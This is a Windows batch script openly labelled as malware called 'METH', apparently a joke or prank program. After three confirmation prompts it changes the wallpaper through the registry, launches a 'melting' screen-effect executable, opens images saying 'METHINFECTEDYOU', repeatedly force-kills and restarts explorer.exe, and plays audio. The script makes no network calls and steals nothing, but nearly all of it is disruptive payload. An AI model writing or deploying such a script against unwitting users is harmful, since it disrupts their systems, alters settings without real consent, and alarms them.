@echo off&title METH
cd methfile
MSGBOX.EXE "Execute Malware?" "meth" YESNO
if errorlevel 7 goto exitpp
if errorlevel 6 goto warning2

:warning2
cls
MSGBOX.EXE "This is the 2nd Warning! Are you sure that you want to run this Malware?" "meth" YESNO
if errorlevel 7 goto exitpp
if errorlevel 6 goto finalwarning

:finalwarning
cls
MSGBOX.EXE "This is the FINAL WARNING! ARE YOU SURE THAT YOU WANT TO RUN THIS MALWARE? I am not responsible for any damage caused by this Malware." "meth" YESNO
if errorlevel 7 goto exitpp
if errorlevel 6 goto Payload1

:Payload1
cls
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  %userprofile%\Desktop\methfile\Images\background.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cls
cd GDI
start Zer0Mem0ry@Melting.exe
timeout 10 >nul
taskkill /f /im Zer0Mem0ry@Melting.exe
cls
cd..
cls
goto Payload2

:Payload2
cls
cd Images
start URDONE.png
timeout 1 >nul
start METHINFECTEDYOU.png
timeout 1 >nul
start URDONE.png
timeout 1 >nul
start METHINFECTEDYOU.png
timeout 1 >nul
start URDONE.png
timeout 1 >nul
start METHINFECTEDYOU.png
timeout 1 >nul
start URDONE.png
timeout 1 >nul
start METHINFECTEDYOU.png
timeout 1 >nul
cd..
cls
goto Payload3

:Payload3
cls
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
taskkill /f /im explorer.exe
cls
timeout 1 >nul
start explorer.exe
timeout 1 >nul
cls
goto Payload4

:Payload4
cls
cd SFX
start audio.mp3
cls
timeout 6 >nul
taskkill /f /im Microsoft.Media.Player.exe
cls
start audio2.mp3
cls
timeout 36 >nul
taskkill /f /im Microsoft.Media.Player.exe
cls
goto Payload5

:Payload5
cls

:exitpp
cls
exit /b